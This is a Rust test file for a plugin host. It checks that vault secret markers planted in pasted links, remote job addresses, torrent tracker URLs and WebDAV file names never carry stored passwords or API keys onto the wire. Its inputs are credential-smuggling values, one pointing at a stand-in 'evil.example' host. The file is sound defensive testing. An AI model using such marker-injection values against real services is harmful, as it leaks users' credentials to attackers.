//! Addresses and files somebody else made never carry a credential onto the wire (RD-120-66).
//!
//! The host expands vault markers wherever a plugin's request carries them, and it cannot tell
//! one the plugin wrote from one inside a value the plugin copied: a link pasted from a web
//! page, a magnet, a file name, a file's bytes. Each case here drives the real plugin through the
//! application's own host to a TLS mock (`support/notifier_wire.rs`) and reads what arrived.
//!
//! | Case | Plugin | Foreign value | Where the credential went before |
//! | --- | --- | --- | --- |
//! | 1 | linksnappy (built in) | the link to resolve | into `genLinks`, which LinkSnappy then fetches |
//! | 2 | torbox-jobs | a remote job's address | into the multipart body TorBox then fetches |
//! | 3 | torbox-jobs | a `.torrent` that is valid UTF-8 | into the uploaded container's tracker address |
//! | 4 | webdav-storage | a file's name and its content | into the stored file's path and its bytes |

#[path = "support/notifier_wire.rs"]
mod support;

use rd_plugin_host::{
    PluginManifest,
    artifact::component,
    extension::{RemoteJobPlugin, RemoteJobSource, SourceState, StoragePlugin, Upload},
};
use support::{Arrived, Service, account, register_providers, service_over, wire};

const PASSWORD: &str = "hunter2-linksnappy";
const TORBOX_KEY: &str = "tb-key-0123456789";
const DAV_SECRET: &str = "ZGF2OmRhdi1wYXNzd29yZA";

fn arrived(wire: &support::Wire) -> Vec<Arrived> {
    wire.arrived.lock().expect("arrived").clone()
}

/// Everything that arrived, as one text, with the one header a plugin legitimately put a
/// credential in taken out.
fn wire_text(requests: &[Arrived], allowed_header: Option<&str>) -> String {
    requests
        .iter()
        .map(|request| {
            let headers: Vec<_> = request
                .headers
                .iter()
                .filter(|(name, _)| {
                    allowed_header.is_none_or(|allowed| !name.eq_ignore_ascii_case(allowed))
                })
                .collect();
            format!(
                "{} {} {:?} {}",
                request.method,
                request.target,
                headers,
                String::from_utf8_lossy(&request.body)
            )
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn percent_decoded(text: &str) -> String {
    url::form_urlencoded::parse(format!("x={text}").as_bytes())
        .map(|(_, value)| value.into_owned())
        .collect()
}

#[tokio::test]
async fn case_1_a_link_to_resolve_does_not_take_the_multihoster_password_along() {
    register_providers();
    let wire = wire().await;
    let directory = tempfile::tempdir().expect("tempdir");
    let parts = service_over(directory.path(), &wire).await;
    let id = account(&parts, "linksnappy", "owner", PASSWORD).await;
    let link: url::Url =
        "https://rapidgator.net/file/abc?x={{secret:linksnappy_password}}&u={{username}}"
            .parse()
            .expect("link");

    let result = parts.service.resolve(link, Some(id), None, None).await;

    let requests = arrived(&wire);
    let text = percent_decoded(&wire_text(&requests, None));
    assert!(!text.contains(PASSWORD), "the password left: {text}");
    assert!(!text.contains("owner"), "the user name left: {text}");
    // Refused before the plugin saw it, with a code the interface translates.
    let failure = result.expect_err("a marked link is refused");
    assert_eq!(
        failure.code.as_deref(),
        Some("plugin.address_carries_marker")
    );
    assert!(requests.is_empty(), "{requests:?}");
}

fn torbox_jobs(parts: &Service) -> RemoteJobPlugin {
    let source = std::fs::read_to_string(
        std::path::PathBuf::from(std::env::var_os("CARGO_MANIFEST_DIR").expect("dir"))
            .join("../../plugins/torbox-jobs/manifest.toml"),
    )
    .expect("manifest");
    let manifest: PluginManifest = toml::from_str(&source).expect("manifest");
    RemoteJobPlugin::new(
        manifest,
        &component("rd-plugin-torbox-jobs"),
        Some(parts.service.host()),
    )
    .expect("compile")
}

#[tokio::test]
async fn case_2_a_remote_jobs_address_does_not_take_the_key_along() {
    register_providers();
    let wire = wire().await;
    let directory = tempfile::tempdir().expect("tempdir");
    let parts = service_over(directory.path(), &wire).await;
    let id = account(&parts, "torbox", "owner", TORBOX_KEY).await;
    let plugin = torbox_jobs(&parts);
    let source = RemoteJobSource::Address(
        "https://evil.example/f.bin?x={{secret:torbox_api_key}}".to_owned(),
    );

    let answer = plugin.submit(id, &source, "web:1").await.expect("no trap");

    let requests = arrived(&wire);
    let text = percent_decoded(&wire_text(&requests, Some("authorization")));
    assert!(!text.contains(TORBOX_KEY), "the key left: {text}");
    let refusal = answer.expect_err("a marked address is refused");
    assert_eq!(
        refusal.code.as_deref(),
        Some("plugin.address_carries_marker")
    );
    assert!(requests.is_empty(), "{requests:?}");
}

#[tokio::test]
async fn case_3_a_container_that_is_valid_utf8_is_uploaded_as_it_is() {
    register_providers();
    let wire = wire().await;
    let directory = tempfile::tempdir().expect("tempdir");
    let parts = service_over(directory.path(), &wire).await;
    let id = account(&parts, "torbox", "owner", TORBOX_KEY).await;
    let plugin = torbox_jobs(&parts);
    // A well-formed single-file torrent, all ASCII, whose tracker address carries a marker.
    let announce = "http://tracker.example/a?k={{secret:torbox_api_key}}";
    let torrent = format!(
        "d8:announce{}:{announce}4:infod6:lengthi1e4:name1:a12:piece lengthi16384e6:pieces20:\
         aaaaaaaaaaaaaaaaaaaaee",
        announce.len()
    );

    let _ = plugin
        .submit(
            id,
            &RemoteJobSource::Container(torrent.clone().into_bytes()),
            "c:1",
        )
        .await
        .expect("no trap");

    let requests = arrived(&wire);
    assert_eq!(requests.len(), 1, "{requests:?}");
    let body = String::from_utf8_lossy(&requests[0].body).into_owned();
    // The container reached the provider byte for byte: nothing was expanded inside it.
    assert!(body.contains(&torrent), "{body}");
    assert!(
        !body.contains(TORBOX_KEY),
        "the key is in the upload: {body}"
    );
    assert_eq!(
        requests[0].header("authorization"),
        Some(format!("Bearer {TORBOX_KEY}").as_str())
    );
}

#[tokio::test]
async fn case_4_a_stored_file_keeps_its_name_and_bytes_and_not_the_password() {
    let wire = wire().await;
    let directory = tempfile::tempdir().expect("tempdir");
    let parts = service_over(directory.path(), &wire).await;
    let reference = parts
        .secrets
        .put_string(DAV_SECRET.to_owned())
        .await
        .expect("put secret");
    let manifest: PluginManifest = toml::from_str(include_str!(
        "../../../plugins/webdav-storage/manifest.toml"
    ))
    .expect("manifest");
    let plugin = StoragePlugin::new(
        manifest,
        &component("rd-plugin-webdav-storage"),
        Some(parts.service.host()),
    )
    .expect("compile");
    let package = tempfile::tempdir().expect("package");
    let name = "{{secret}}.txt";
    let content = b"release notes {{secret}} end\n".to_vec();
    std::fs::write(package.path().join(name), &content).expect("write");

    let outcome = plugin
        .put(
            SourceState::new(
                "package-1".to_owned(),
                package.path().to_path_buf(),
                vec![name.to_owned()],
            ),
            Upload {
                file_name: name,
                size: content.len() as u64,
                destination: "https://cloud.example/dav/Downloads",
                username: Some("dav"),
                secret_ref: Some(&reference),
                checkpoint: None,
            },
        )
        .await
        .expect("put");

    let requests = arrived(&wire);
    let put = requests
        .iter()
        .find(|request| request.method == "PUT")
        .unwrap_or_else(|| panic!("no PUT arrived: {outcome:?} {requests:?}"));
    // The name as the server stores it, and the bytes as they were downloaded.
    assert_eq!(
        percent_decoded(put.path()),
        "/dav/Downloads/package-1/{{secret}}.txt"
    );
    assert_eq!(put.body, content);
    let text = wire_text(&requests, Some("authorization"));
    assert!(!text.contains(DAV_SECRET), "the password left: {text}");
    assert_eq!(
        put.header("authorization"),
        Some(format!("Basic {DAV_SECRET}").as_str())
    );
}
